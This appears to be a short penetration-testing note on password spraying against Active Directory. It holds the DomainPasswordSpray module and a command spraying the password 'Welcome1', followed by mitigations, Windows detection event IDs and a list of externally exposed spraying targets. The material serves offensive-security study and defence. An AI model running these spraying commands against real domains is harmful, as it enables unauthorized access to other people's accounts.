Tool:
- https://github.com/dafthack/DomainPasswordSpray

Flags:
-UserList
-Password
-OutFile

```shell-session
Import-Module .\DomainPasswordSpray.ps1
```
```shell-session
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## Mitigations
- MFA
- Restricting access
- Reducing impact of successful exploitation
- Password hygiene

## Detection
- event ID 4625: An account failed to log on
- event ID 4771: Kerberos pre-authentication failed

## External Password Spraying
- Microsoft 365
- Outlook Web Exchange
- Exhcange Web Access
- Skype for Business
- Linc Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonciWall, OpenVPN, Fortinet, etc. that use AD authentication
- Custom web applications that use AD authentication
